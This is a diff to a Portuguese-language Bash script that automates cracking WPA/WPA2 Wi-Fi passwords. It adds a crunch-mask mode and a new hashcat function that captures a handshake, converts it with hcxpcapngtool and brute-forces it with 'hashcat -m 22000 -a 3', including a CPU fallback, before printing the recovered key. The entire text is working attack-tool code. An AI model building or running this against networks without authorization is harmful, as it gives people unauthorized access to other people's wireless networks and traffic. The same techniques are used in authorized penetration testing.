@@ -501,36 +501,75 @@ ultimo_cap() {
 
 rota_mascara() {
     echo
-    echo "--- Rota A: ataque de máscara (prefixo conhecido) ---"
-    local tamanho prefixo tipo_restante placeholder
+    echo "--- Rota A: ataque de máscara ---"
+    local tamanho prefixo tipo_restante placeholder mascara modo restante i
 
-    read -rp "Tamanho total da senha (ex.: 12): " tamanho
-    read -rp "Prefixo conhecido (ex.: CRIPTO): " prefixo
+    echo "Como montar a máscara?"
+    echo "  [1] Máscara completa do crunch (parte conhecida em QUALQUER posição)"
+    echo "  [2] Modo guiado: prefixo conhecido + uma classe para o resto"
+    echo "  [3] Máscara hashcat (?a=qualquer caractere; usa GPU) — p/ posições cuja classe você não sabe"
+    read -rp "Escolha: " modo
 
-    local restante=$(( tamanho - ${#prefixo} ))
-    if [[ $restante -lt 0 ]]; then
-        erro "Prefixo maior que o tamanho total. Abortando rota de máscara."
-        return 1
-    fi
-
-    echo "Tipo de caractere nas posições desconhecidas:"
-    echo "  [1] números (%)"
-    echo "  [2] maiúsculas (,)"
-    echo "  [3] minúsculas (@)"
-    echo "  [4] símbolos (^)"
-    read -rp "Escolha: " tipo_restante
-    case "$tipo_restante" in
-        1) placeholder="%" ;;
-        2) placeholder="," ;;
-        3) placeholder="@" ;;
-        4) placeholder="^" ;;
-        *) erro "Opção inválida."; return 1 ;;
+    case "$modo" in
+        1)
+            echo "Coringas (convenção do crunch) nas posições DESCONHECIDAS:"
+            echo "  %=número   ,=maiúscula   @=minúscula   ^=símbolo"
+            echo "Resto fica FIXO. Ex.: HEX%%123%% = HEX + 2 dígitos + 123 + 2 dígitos."
+            read -rp "Máscara: " mascara
+            if [[ -z "$mascara" ]]; then
+                erro "Máscara vazia. Abortando rota de máscara."
+                return 1
+            fi
+            # Tamanho = nº de posições de saída; \X (coringa escapado) conta como 1
+            local sem_escape="${mascara//\\/}"
+            tamanho=${#sem_escape}
+            if ! [[ "$mascara" =~ [%,@^] ]]; then
+                log "Aviso: máscara sem coringa (% , @ ^) — vai testar só essa senha fixa."
+            fi
+            ;;
+        2)
+            read -rp "Tamanho total da senha (ex.: 12): " tamanho
+            read -rp "Prefixo conhecido (ex.: CRIPTO): " prefixo
+            if ! [[ "$tamanho" =~ ^[0-9]+$ ]]; then
+                erro "Tamanho inválido. Abortando rota de máscara."
+                return 1
+            fi
+            restante=$(( tamanho - ${#prefixo} ))
+            if [[ $restante -lt 0 ]]; then
+                erro "Prefixo maior que o tamanho total. Abortando rota de máscara."
+                return 1
+            fi
+            echo "Tipo de caractere nas posições desconhecidas:"
+            echo "  [1] números (%)"
+            echo "  [2] maiúsculas (,)"
+            echo "  [3] minúsculas (@)"
+            echo "  [4] símbolos (^)"
+            read -rp "Escolha: " tipo_restante
+            case "$tipo_restante" in
+                1) placeholder="%" ;;
+                2) placeholder="," ;;
+                3) placeholder="@" ;;
+                4) placeholder="^" ;;
+                *) erro "Opção inválida."; return 1 ;;
+            esac
+            mascara="${prefixo}"
+            for ((i=0; i<restante; i++)); do mascara+="${placeholder}"; done
+            ;;
+        3)
+            rota_mascara_hashcat
+            return $?
+            ;;
+        *)
+            erro "Opção inválida."
+            return 1
+            ;;
     esac
 
-    local mascara="${prefixo}"
-    for ((i=0; i<restante; i++)); do mascara+="${placeholder}"; done
+    if [[ "$tamanho" -lt 8 ]]; then
+        log "Aviso: WPA/WPA2 exige senha de 8+ caracteres — máscara de ${tamanho} dificilmente casa."
+    fi
 
-    log "Capturando handshake para rodar máscara '${mascara}'..."
+    log "Capturando handshake para rodar máscara '${mascara}' (tamanho ${tamanho})..."
     if ! capturar_handshake; then
         return 1
     fi
@@ -544,12 +583,75 @@ rota_mascara() {
         | grep -i "KEY FOUND" | sed -E 's/.*\[\s*(.*)\s*\].*/\1/')"
 
     if [[ -n "${SENHA_ENCONTRADA}" ]]; then
-        ROTA_USADA="Máscara (prefixo conhecido)"
+        ROTA_USADA="Máscara (crunch)"
         log "Senha encontrada via máscara: ${SENHA_ENCONTRADA}"
         return 0
     fi
 
     erro "Máscara não encontrou a senha com os parâmetros informados."
+    return 1
+}
+
+# Variante da Rota A com coringas do hashcat (-a 3). Diferente do crunch, o
+# hashcat tem ?a = QUALQUER caractere imprimível (?l minúscula, ?u maiúscula,
+# ?d dígito, ?s símbolo) — útil quando você não sabe a classe de uma posição.
+# Usa GPU; cai para CPU com --force se nenhum dispositivo for detectado.
+rota_mascara_hashcat() {
+    local mascara custom
+    echo
+    echo "Coringas do hashcat: ?d=dígito ?l=minúscula ?u=maiúscula ?s=símbolo ?a=qualquer."
+    echo "Resto fica FIXO. Ex.: HEX?a?a12?a?a = HEX + 2 quaisquer + 12 + 2 quaisquer."
+    read -rp "Máscara hashcat: " mascara
+    if [[ -z "$mascara" ]]; then
+        erro "Máscara vazia. Abortando."
+        return 1
+    fi
+    read -rp "Charset custom p/ ?1 (ex.: ?l?u?d; ENTER p/ pular): " custom
+
+    if ! capturar_handshake; then
+        return 1
+    fi
+    local cap
+    cap="$(ultimo_cap)"
+
+    if ! command -v hcxpcapngtool &>/dev/null; then
+        erro "hcxpcapngtool não encontrado — não dá pra converter a captura pro hashcat."
+        return 1
+    fi
+    local hashfile="${WORKDIR}/hash_mask.hc22000"
+    rm -f "$hashfile"
+    hcxpcapngtool -o "$hashfile" "$cap" &>>"$LOGFILE"
+    if [[ ! -s "$hashfile" ]]; then
+        erro "Não foi possível extrair hash da captura (handshake pode estar incompleto)."
+        return 1
+    fi
+
+    local found="${WORKDIR}/hashcat_mask_found.txt"
+    local hc_out="${WORKDIR}/hashcat_mask.out"
+    rm -f "$found"
+    local custom_flag=()
+    [[ -n "$custom" ]] && custom_flag=(-1 "$custom")
+
+    log "Rodando hashcat -a 3 com máscara '${mascara}' (pode demorar conforme o espaço de busca)..."
+    hashcat -m 22000 "$hashfile" -a 3 "${custom_flag[@]}" "$mascara" \
+        --potfile-disable -o "$found" >"$hc_out" 2>&1
+    cat "$hc_out" >> "$LOGFILE"
+    # Sem GPU/driver OpenCL o hashcat aborta com "No devices" — repete forçando CPU.
+    if [[ ! -s "$found" ]] && grep -qiE "no devices? (found|left)" "$hc_out"; then
+        log "Nenhum dispositivo detectado — repetindo com --force (CPU, mais lento)..."
+        hashcat -m 22000 "$hashfile" -a 3 "${custom_flag[@]}" "$mascara" \
+            --force --potfile-disable -o "$found" >"$hc_out" 2>&1
+        cat "$hc_out" >> "$LOGFILE"
+    fi
+
+    if [[ -s "$found" ]]; then
+        SENHA_ENCONTRADA="$(cut -d':' -f2- "$found" | tail -1)"
+        ROTA_USADA="Máscara (hashcat -a 3)"
+        log "Senha encontrada via máscara hashcat: ${SENHA_ENCONTRADA}"
+        return 0
+    fi
+
+    erro "Máscara hashcat não encontrou a senha com os parâmetros informados."
     return 1
 }
 
